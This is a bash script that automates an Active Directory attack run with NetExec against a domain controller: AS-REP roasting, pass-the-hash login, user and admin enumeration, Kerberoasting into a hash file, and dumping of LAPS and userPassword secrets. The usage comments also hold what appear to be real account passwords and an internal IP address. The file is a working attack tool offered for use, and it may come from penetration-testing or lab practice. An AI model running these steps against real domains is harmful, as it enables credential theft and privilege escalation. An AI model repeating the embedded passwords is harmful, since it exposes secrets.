#!/bin/bash
#How to run this script
#run script like:
#bash nxc_enumerate.sh 172.16.111.6 maildmz P DPuBT9tGCBrTbR
#if a password contains special characters, you need to append \ before the special characters
#example: administrator with password: vau!XCKjNQBv2$
#bash nxc_enumerate.sh 172.16.111.6 administrator P vau\!XCKjNQBv2\$

#if you want to output to a file, run like below:
#bash nxc_enumerate.sh 172.16.111.6 maildmz P DPuBT9tGCBrTbR | tee outputfile.txt
#bash -x nxc_enumerate.sh 172.16.111.6 administrator P vau\!XCKjNQBv2\$ | tee outputfile.txt

#if you want to disable event expansion before running the script:
#set +o histexpand
#bash nxc_enumerate.sh 172.16.111.6 administrator P vau!XCKjNQBv2$
#bash -x nxc_enumerate.sh 172.16.111.6 administrator P vau!XCKjNQBv2$ | tee outputfile.txt


#  Check if the correct number of arguments are provided
if [ "$#" -ne 4 ]; then
    echo "Usage: bash script.sh <DC_IPADDRESS> <Username> <P OR H> <Password/HASH>"
    exit 1
fi

# Assign command-line arguments to variables
ipaddress=$1
user=$2
option=$3
pass_hash=$4

# 1. ASREPRoasting exploits accounts that do not require Kerberos pre-authentication to extract service ticket hashes, which can then be cracked offline.
echo " "
echo "1. ASREPRoasting exploits accounts that do not require Kerberos pre-authentication to extract service ticket hashes, which can then be cracked offline."
echo "nxc ldap $ipaddress -u $user -p ''  -k"
nxc ldap "$ipaddress" -u "$user" -p '' -k
echo " "
echo "======================================================"
echo " "

# Check if option is P or H (case-insensitive)
if [ "${option^^}" = "P" ]; then
    # Code for when option is P
    #START OF CODE!
echo " "
echo "2. Testing Credentials."
echo "This command tests a user’s credentials to validate whether they are correct, either with a plaintext password or an NTLM hash."
echo "nxc ldap $ipaddress -u $user -p $pass_hash "
nxc ldap $ipaddress -u $user -p $pass_hash
echo " "
echo "======================================================"
echo " "

echo " "
echo "3a. Enumerating All Users."
echo "To retrieve all user accounts in the Active Directory domain. This is a key reconnaissance step to identify potential targets for further attacks."
echo "nxc ldap $ipaddress -u $user -p $pass_hash --users"
nxc ldap $ipaddress -u $user -p $pass_hash --users
echo " "
echo "======================================================"
echo " "
echo "3b. Enumerating Active Users."
echo "nxc ldap $ipaddress -u $user -p $pass_hash --active-users"
nxc ldap $ipaddress -u $user -p $pass_hash --active-users
echo " "
echo "======================================================"
echo " "

#TEMPORARY COMMENT OUT
#echo " "
#echo "4. LDAP Queries for Specific"
#echo "Queries LDAP for specific user attributes, such as their sAMAccountName."
#echo "nxc ldap $ipaddress -u $user -p $pass_hash --query '(sAMAccountName=*)' ' '"
#nxc ldap $ipaddress -u $user -p $pass_hash --query "(sAMAccountName=*)" ""
#echo " "
#echo "======================================================"
#echo " "
#TEMPORARY COMMENT OUT

echo " "
echo "5. Find Domain SID"
echo "Retrieves the Domain Security Identifier (SID), which is a unique identifier for the domain."
echo "nxc ldap $ipaddress -u $user -p $pass_hash --get-sid"
nxc ldap $ipaddress -u $user -p $pass_hash --get-sid
echo " "
echo "======================================================"
echo " "

echo " "
echo "6. Admin Count Enumeration"
echo "Identifies high-privilege accounts such as Domain Admins by checking the AdminCount attribute."
echo "nxc ldap $ipaddress -u $user -p $pass_hash --admin-count"
nxc ldap $ipaddress -u $user -p $pass_hash --admin-count
echo " "
echo "======================================================"
echo " "

echo " "
echo "7. Kerberoasting"
echo "Kerberoasting extracts service account hashes by requesting service tickets for accounts with SPNs (Service Principal Names)."
echo "nxc ldap $ipaddress -u $user -p $pass_hash --kerberoasting hash.txt"
nxc ldap $ipaddress -u $user -p $pass_hash --kerberoasting hash.txt
echo " "
echo "======================================================"
echo " "

echo " "
echo "8. User Description Enumeration"
echo "Enumerates the user descriptions for identifying potential sensitive information."
echo "nxc ldap $ipaddress -u $user -p $pass_hash -M user-desc"
nxc ldap $ipaddress -u $user -p $pass_hash -M user-desc
echo " "
echo "======================================================"
echo " "

echo " "
echo "9. WhoAmI Command"
echo "The whoami command retrieves the current authenticated user in the session."
echo "nxc ldap $ipaddress -u $user -p $pass_hash -M whoami"
nxc ldap $ipaddress -u $user -p $pass_hash -M whoami
echo " "
echo "======================================================"
echo " "

echo " "
echo "10. Enumerating Group Membership"
echo "This command is used to enumerate the groups that a specific user is a member of. This helps identify high-privilege groups and lateral movement opportunities."
echo " "
echo "You can replace the user with someone else. Just run the command manually and replace the last part with a username."
echo " "
echo "nxc ldap $ipaddress -u $user -p $pass_hash -M groupmembership -o USER='$user'"
nxc ldap $ipaddress -u $user -p $pass_hash -M groupmembership -o USER="$user"
echo " "
echo "======================================================"
echo " "

echo " "
echo "11. Group Members Enumeration"
echo "This command allows you to enumerate the members of a specific group, such as “Domain Admins” or “Domain Users,” which can reveal key targets for attacks."
echo "nxc ldap $ipaddress -u $user -p $pass_hash -M group-mem -o GROUP='Domain users'"
nxc ldap $ipaddress -u $user -p $pass_hash -M group-mem -o GROUP="Domain users"
echo " "
echo "nxc ldap $ipaddress -u $user -p $pass_hash -M group-mem -o GROUP='Domain Admins'"
nxc ldap $ipaddress -u $user -p $pass_hash -M group-mem -o GROUP="Domain Admins"
echo " "
echo "nxc ldap $ipaddress -u $user -p $pass_hash -M group-mem -o GROUP='Enterprise Admins'"
nxc ldap $ipaddress -u $user -p $pass_hash -M group-mem -o GROUP="Enterprise Admins"
echo " "
echo "======================================================"
echo " "

echo " "
echo "12. Get User Descriptions"
echo "Enumerates the user descriptions for identifying potential sensitive information."
echo "nxc ldap $ipaddress -u $user -p $pass_hash -M get-desc-users"
nxc ldap $ipaddress -u $user -p $pass_hash -M get-desc-users
echo " "
echo "======================================================"
echo " "

echo " "
echo "13. LAPS Enumeration"
echo "LAPS (Local Administrator Password Solution) is a Microsoft solution that randomizes and stores local administrator passwords. This command retrieves the LAPS password for local administrator accounts."
echo "nxc ldap $ipaddress -u $user -p $pass_hash -M laps"
nxc ldap $ipaddress -u $user -p $pass_hash -M laps
echo " "
echo "======================================================"
echo " "

echo " "
echo "14. Get User Passwords"
echo "This command retrieves user passwords, which can be critical for offline cracking or further attacks."
echo "nxc ldap $ipaddress -u $user -p $pass_hash -M get-userPassword"
nxc ldap $ipaddress -u $user -p $pass_hash -M get-userPassword
echo " "
echo "======================================================"
echo " "

elif [ "${option^^}" = "H" ]; then
    # Code for when option is H
    #START OF CODE!
echo " "
echo "2. Testing Credentials."
echo "This command tests a user’s credentials to validate whether they are correct, either with a plaintext password or an NTLM hash."
echo "nxc ldap $ipaddress -u $user -H $pass_hash "
nxc ldap $ipaddress -u $user -H $pass_hash
echo " "
echo "======================================================"
echo " "

echo " "
echo "3a. Enumerating All Users."
echo "To retrieve all user accounts in the Active Directory domain. This is a key reconnaissance step to identify potential targets for further attacks."
echo "nxc ldap $ipaddress -u $user -H $pass_hash --users"
nxc ldap $ipaddress -u $user -H $pass_hash --users
echo " "
echo "======================================================"
echo " "
echo "3b. Enumerating Active Users."
echo "nxc ldap $ipaddress -u $user -H $pass_hash --active-users"
nxc ldap $ipaddress -u $user -H $pass_hash --active-users
echo " "
echo "======================================================"
echo " "

#TEMPORARY COMMENT OUT
#echo " "
#echo "4. LDAP Queries for Specific"
#echo "Queries LDAP for specific user attributes, such as their sAMAccountName."
#echo "nxc ldap $ipaddress -u $user -H $pass_hash --query '(sAMAccountName=*)' ' '"
#nxc ldap $ipaddress -u $user -H $pass_hash --query "(sAMAccountName=*)" ""
#echo " "
#echo "======================================================"
#echo " "
#TEMPORARY COMMENT OUT

echo " "
echo "5. Find Domain SID"
echo "Retrieves the Domain Security Identifier (SID), which is a unique identifier for the domain."
echo "nxc ldap $ipaddress -u $user -H $pass_hash --get-sid"
nxc ldap $ipaddress -u $user -H $pass_hash --get-sid
echo " "
echo "======================================================"
echo " "

echo " "
echo "6. Admin Count Enumeration"
echo "Identifies high-privilege accounts such as Domain Admins by checking the AdminCount attribute."
echo "nxc ldap $ipaddress -u $user -H $pass_hash --admin-count"
nxc ldap $ipaddress -u $user -H $pass_hash --admin-count
echo " "
echo "======================================================"
echo " "

echo " "
echo "7. Kerberoasting"
echo "Kerberoasting extracts service account hashes by requesting service tickets for accounts with SPNs (Service Principal Names)."
echo "nxc ldap $ipaddress -u $user -H $pass_hash --kerberoasting hash.txt"
nxc ldap $ipaddress -u $user -H $pass_hash --kerberoasting hash.txt
echo " "
echo "======================================================"
echo " "

echo " "
echo "8. User Description Enumeration"
echo "Enumerates the user descriptions for identifying potential sensitive information."
echo "nxc ldap $ipaddress -u $user -H $pass_hash -M user-desc"
nxc ldap $ipaddress -u $user -H $pass_hash -M user-desc
echo " "
echo "======================================================"
echo " "

echo " "
echo "9. WhoAmI Command"
echo "The whoami command retrieves the current authenticated user in the session."
echo "nxc ldap $ipaddress -u $user -H $pass_hash -M whoami"
nxc ldap $ipaddress -u $user -H $pass_hash -M whoami
echo " "
echo "======================================================"
echo " "

echo " "
echo "10. Enumerating Group Membership"
echo "This command is used to enumerate the groups that a specific user is a member of. This helps identify high-privilege groups and lateral movement opportunities."
echo " "
echo "You can replace the user with someone else. Just run the command manually and replace the last part with a username."
echo " "
echo "nxc ldap $ipaddress -u $user -H $pass_hash -M groupmembership -o USER='$user'"
nxc ldap $ipaddress -u $user -H $pass_hash -M groupmembership -o USER="$user"
echo " "
echo "======================================================"
echo " "

echo " "
echo "11. Group Members Enumeration"
echo "This command allows you to enumerate the members of a specific group, such as “Domain Admins” or “Domain Users,” which can reveal key targets for attacks."
echo "nxc ldap $ipaddress -u $user -H $pass_hash -M group-mem -o GROUP='Domain users'"
nxc ldap $ipaddress -u $user -H $pass_hash -M group-mem -o GROUP="Domain users"
echo " "
echo "nxc ldap $ipaddress -u $user -H $pass_hash -M group-mem -o GROUP='Domain Admins'"
nxc ldap $ipaddress -u $user -H $pass_hash -M group-mem -o GROUP="Domain Admins"
echo " "
echo "nxc ldap $ipaddress -u $user -H $pass_hash -M group-mem -o GROUP='Enterprise Admins'"
nxc ldap $ipaddress -u $user -H $pass_hash -M group-mem -o GROUP="Enterprise Admins"
echo " "
echo "======================================================"
echo " "

echo " "
echo "12. Get User Descriptions"
echo "Enumerates the user descriptions for identifying potential sensitive information."
echo "nxc ldap $ipaddress -u $user -H $pass_hash -M get-desc-users"
nxc ldap $ipaddress -u $user -H $pass_hash -M get-desc-users
echo " "
echo "======================================================"
echo " "

echo " "
echo "13. LAPS Enumeration"
echo "LAPS (Local Administrator Password Solution) is a Microsoft solution that randomizes and stores local administrator passwords. This command retrieves the LAPS password for local administrator accounts."
echo "nxc ldap $ipaddress -u $user -H $pass_hash -M laps"
nxc ldap $ipaddress -u $user -H $pass_hash -M laps
echo " "
echo "======================================================"
echo " "

echo " "
echo "14. Get User Passwords"
echo "This command retrieves user passwords, which can be critical for offline cracking or further attacks."
echo "nxc ldap $ipaddress -u $user -H $pass_hash -M get-userPassword"
nxc ldap $ipaddress -u $user -H $pass_hash -M get-userPassword
echo " "
echo "======================================================"
echo " "


else
    echo "Error: Option must be either 'P' or 'H'."
    exit 1
fi

